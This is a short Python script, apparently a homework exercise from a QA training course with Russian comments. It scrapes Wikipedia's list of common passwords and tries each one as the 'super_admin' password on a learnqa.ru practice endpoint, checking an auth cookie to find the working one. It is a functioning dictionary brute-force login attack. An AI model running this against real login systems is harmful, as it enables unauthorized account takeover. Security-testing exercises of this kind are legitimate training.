import requests
from lxml import html

# Парсим с сайта пароли

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

passes_list = []

for password in passwords:
    password = str(password).strip()
    passes_list.append(password)

# Оставляем только уникальные пароли в списке паролей
uniq_passes_list = list(dict.fromkeys(passes_list))

# Перебираем пароли
for i in uniq_passes_list:
    payload = {"login":"super_admin", "password":i}
    r1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    cookie_value = r1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}

    r2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if r2.text != "You are NOT authorized":
        print(i)
        print(r2.text)
        break